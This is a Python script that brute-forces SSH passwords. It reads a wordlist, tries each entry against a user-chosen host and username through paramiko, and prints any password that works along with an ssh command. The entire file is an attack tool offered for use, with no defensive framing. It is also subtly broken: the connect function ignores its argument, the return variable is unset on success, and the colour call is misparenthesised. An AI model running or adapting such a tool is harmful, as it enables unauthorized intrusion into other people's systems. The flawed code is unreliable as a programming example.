import socket ,os ,paramiko,termcolor,sys

def ssh_connect(password_code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
         ssh.connect(host,port=22,username=username,password=password)

    except paramiko.AuthenticationException:
        code=1
    except socket.error:
        code=2

    ssh.close()
    return code


host=input("Enter the host you want to connect : ")
username = input("ENTER THE USERNAME FOR TARGET MACHINE : ")
input_file=input("enter the file you want to use for passwords : ")

if os.path.exists(input_file) ==False:
    print("The file you entered doesn't exist!!!!")
    sys.exit(1)

with open(input_file,'r') as file:
    for line in file.readlines(): #file.readline() means read the given file char by char 
        # but using file.readlines() reads it line by line
        password=line.strip()
        try:
            response=ssh_connect(password)
            if response==0:
                print(termcolor.colored((f"FOUND PASSWORD $$ [+ successfull connection] for connection copy : ssh {username}@{host}:{password}")),'blue')
                break
            elif response==1:
                print(f"incorrect password : {password}")
            elif response==2:
                print("Can't connect : possibly target OFFLINE ")
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
        
